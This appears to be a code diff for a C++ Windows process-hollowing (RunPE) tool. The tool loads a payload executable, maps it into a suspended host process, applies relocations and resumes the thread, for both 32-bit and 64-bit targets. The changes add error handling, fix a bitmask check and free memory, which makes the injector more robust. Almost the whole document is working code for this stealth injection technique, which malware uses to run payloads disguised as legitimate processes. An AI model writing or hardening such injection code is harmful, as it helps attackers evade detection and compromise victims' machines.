@@ -105,6 +105,13 @@ LPVOID GetFileContent(const LPSTR& lpSourceImage, DWORD& dwFileSize) {
         CloseHandle(hFile);
         return nullptr;
     }
+    else if(dwReadByte != dwFileSize)
+    {
+        std::cout << "\nReadFile did not read enough data.";
+        HeapFree(GetProcessHeap(), 0, lpFileContent);
+        CloseHandle(hFile);
+        return nullptr; 
+    }
 
     std::cout << "\n[+] Byte read: " << dwReadByte;
 
@@ -151,8 +158,8 @@ bool isValidPE(const LPVOID lpPayload, const DWORD dwFileSize) {
     std::cout << "\n[4]";
 
     // Characteristics is a bitmask, therefore need to use &
-    if (lpImageNTHeaders->FileHeader.Characteristics &
-        IMAGE_FILE_EXECUTABLE_IMAGE == 0) {
+    if ((lpImageNTHeaders->FileHeader.Characteristics &
+         IMAGE_FILE_EXECUTABLE_IMAGE) == 0) {
         std::cout << "\nThis payload is not executable.";
         return false;
     }
@@ -271,7 +278,7 @@ DWORD GetPayloadSubsystem64(const LPVOID lpFileContent) {
 
 DWORD GetTargetSubsystem32(const HANDLE hProcess,
                            const LPVOID lpImageBaseAddress) {
-    const IMAGE_DOS_HEADER ImgDOSHeader = {};
+    IMAGE_DOS_HEADER ImgDOSHeader = {};
 
     if (!ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImgDOSHeader,
                            sizeof(IMAGE_DOS_HEADER), nullptr)) {
@@ -279,7 +286,7 @@ DWORD GetTargetSubsystem32(const HANDLE hProcess,
         return (DWORD)-1;
     }
 
-    const IMAGE_NT_HEADERS32 ImgNTHeaders = {};
+    IMAGE_NT_HEADERS32 ImgNTHeaders = {};
     if (!ReadProcessMemory(
             hProcess,
             (LPVOID)((uintptr_t)lpImageBaseAddress + ImgDOSHeader.e_lfanew),
@@ -293,7 +300,7 @@ DWORD GetTargetSubsystem32(const HANDLE hProcess,
 
 DWORD GetTargetSubsystem64(const HANDLE hProcess,
                            const LPVOID lpImageBaseAddress) {
-    const IMAGE_DOS_HEADER ImgDOSHeader = {};
+    IMAGE_DOS_HEADER ImgDOSHeader = {};
 
     if (!ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImgDOSHeader,
                            sizeof(IMAGE_DOS_HEADER), nullptr)) {
@@ -301,7 +308,7 @@ DWORD GetTargetSubsystem64(const HANDLE hProcess,
         return (DWORD)-1;
     }
 
-    const IMAGE_NT_HEADERS64 ImgNTHeaders = {};
+    IMAGE_NT_HEADERS64 ImgNTHeaders = {};
     if (!ReadProcessMemory(
             hProcess,
             (LPVOID)((uintptr_t)lpImageBaseAddress + ImgDOSHeader.e_lfanew),
@@ -345,6 +352,12 @@ bool RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpFileContent) {
         lpPI->hProcess, (LPVOID)((uintptr_t)lpNT->OptionalHeader.ImageBase),
         (SIZE_T)lpNT->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT,
         PAGE_EXECUTE_READWRITE);
+
+    if(lpAllocAddress == NULL)
+    {
+        std::cout << "\nVirtualAllocEx failed. Error: " << GetLastError();
+        return false;
+    }
 
     // Write headers
     if (!WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpFileContent,
@@ -416,8 +429,15 @@ bool RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpFileContent) {
         return false;
     }
 
-    ResumeThread(lpPI->hThread);
-
+    DWORD prevSuspendedCount = ResumeThread(lpPI->hThread);
+    if (prevSuspendedCount == static_cast<DWORD>(-1)) {
+        std::cout << "\nResumeThread failed. Error: " << GetLastError();
+        return false;
+    } else if (prevSuspendedCount > 1) {
+        std::cout << "\nResumeThread succeeded, but the thread has not resumed yet. Error: "
+                  << GetLastError();
+        return false;
+    }
     return true;
 }
 
@@ -512,7 +532,15 @@ bool RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpFileContent) {
         return false;
     }
 
-    ResumeThread(lpPI->hThread);
+    DWORD prevSuspendedCount = ResumeThread(lpPI->hThread);
+    if (prevSuspendedCount == static_cast<DWORD>(-1)) {
+        std::cout << "\nResumeThread failed. Error: " << GetLastError();
+        return false;
+    } else if (prevSuspendedCount > 1) {
+        std::cout << "\nResumeThread succeeded, but the thread has not resumed yet. Error: "
+                  << GetLastError();
+        return false;
+    }
 
     return true;
 }
@@ -602,8 +630,8 @@ bool RunPEReloc32(const LPPROCESS_INFORMATION lpPI,
     if (bNeedReloc)
         ImgDataReloc = GetReloc32(lpFileContent);  // The reloc table
 
-    if (bNeedReloc && ImgDataReloc.VirtualAddress == 0 &&
-        ImgDataReloc.Size == 0) {
+    if (bNeedReloc && (ImgDataReloc.VirtualAddress == 0 ||
+        ImgDataReloc.Size == 0)) {
         std::cout << "\nUnable to retrieve reloc table. Error code: "
                   << GetLastError();
         return false;
@@ -717,8 +745,7 @@ bool RunPEReloc32(const LPPROCESS_INFORMATION lpPI,
                 }
 
                 else {
-                    std::cout << "\nRelocation type not supported. Error code: "
-                              << GetLastError();
+                    std::cout << "\nRelocation type not supported.";
                     return false;
                 }
 
@@ -767,7 +794,16 @@ bool RunPEReloc32(const LPPROCESS_INFORMATION lpPI,
         return false;
     }
 
-    ResumeThread(lpPI->hThread);
+    DWORD prevSuspendedCount = ResumeThread(lpPI->hThread);
+    if (prevSuspendedCount == static_cast<DWORD>(-1)) {
+        std::cout << "\nResumeThread failed. Error: " << GetLastError();
+        return false;
+    } else if (prevSuspendedCount > 1) {
+        std::cout << "\nResumeThread succeeded, but the thread has not resumed yet. Error: "
+                  << GetLastError();
+        return false;
+    }
+
     return true;
 }
 
@@ -961,8 +997,7 @@ bool RunPEReloc64(const LPPROCESS_INFORMATION lpPI,
                 }
 
                 else {
-                    std::cout << "\nRelocation type not supported. Error code: "
-                              << GetLastError();
+                    std::cout << "\nRelocation type not supported.";
                     return false;
                 }
 
@@ -1008,7 +1043,16 @@ bool RunPEReloc64(const LPPROCESS_INFORMATION lpPI,
         return false;
     }
 
-    ResumeThread(lpPI->hThread);
+    DWORD prevSuspendedCount = ResumeThread(lpPI->hThread);
+    if (prevSuspendedCount == static_cast<DWORD>(-1)) {
+        std::cout << "\nResumeThread failed. Error: " << GetLastError();
+        return false;
+    } else if (prevSuspendedCount > 1) {
+        std::cout << "\nResumeThread succeeded, but the thread has not resumed yet. Error: "
+                  << GetLastError();
+        return false;
+    }
+
     return true;
 }
 
@@ -1047,6 +1091,7 @@ int main(const int argc, char* argv[]) {
                    dwFileSize))  // Check if the payload is a valid PE file
     {
         std::cout << "\nThe payload is not a PE file.";
+        HeapFree(GetProcessHeap(), 0, lpFileContent);
         return -1;
     }
 
@@ -1080,9 +1125,9 @@ int main(const int argc, char* argv[]) {
     }
 
     bool bTarget32;
-    if (ProcessMachine == IMAGE_FILE_MACHINE_I386)
+    if (ProcessMachine == IMAGE_FILE_MACHINE_I386) {
         bTarget32 = true;
-    else if (ProcessMachine == IMAGE_FILE_MACHINE_UNKNOWN) {
+    } else if (ProcessMachine == IMAGE_FILE_MACHINE_UNKNOWN) {
         if (NativeMachine == IMAGE_FILE_MACHINE_AMD64) {
             bTarget32 = false;
         } else if (NativeMachine == IMAGE_FILE_MACHINE_I386) {
@@ -1092,6 +1137,10 @@ int main(const int argc, char* argv[]) {
             CloseProcessAndCleanPayload(&PI, lpFileContent);
             return -1;
         }
+    } else {
+        std::cout << "\nProcessMachine value is not supported";
+        CloseProcessAndCleanPayload(&PI, lpFileContent);
+        return -1;
     }
 
     // Get address info of the target
@@ -1187,6 +1236,7 @@ int main(const int argc, char* argv[]) {
         std::cout << "\n=====PE32=====\n";
         if (RunPE32(&PI, lpFileContent)) {
             std::cout << "\nProcess Hollowing successfully executed.";
+            CloseHandleAndCleanPayload(&PI, lpFileContent);
             return 0;
         }
 
@@ -1196,6 +1246,7 @@ int main(const int argc, char* argv[]) {
         std::cout << "\n=====PEReloc32=====\n";
         if (RunPEReloc32(&PI, lpFileContent)) {
             std::cout << "\nProcess Hollowing successfully executed.";
+            CloseHandleAndCleanPayload(&PI, lpFileContent);
             return 0;
         }
     }
@@ -1204,6 +1255,7 @@ int main(const int argc, char* argv[]) {
         std::cout << "\n=====PE64=====\n";
         if (RunPE64(&PI, lpFileContent)) {
             std::cout << "\nProcess Hollowing successfully executed.";
+            CloseHandleAndCleanPayload(&PI, lpFileContent);
             return 0;
         }
 
@@ -1211,6 +1263,7 @@ int main(const int argc, char* argv[]) {
         std::cout << "\n=====PEReloc64=====\n";
         if (RunPEReloc64(&PI, lpFileContent)) {
             std::cout << "\nProcess Hollowing successfully executed.";
+            CloseHandleAndCleanPayload(&PI, lpFileContent);
             return 0;
         }
     }
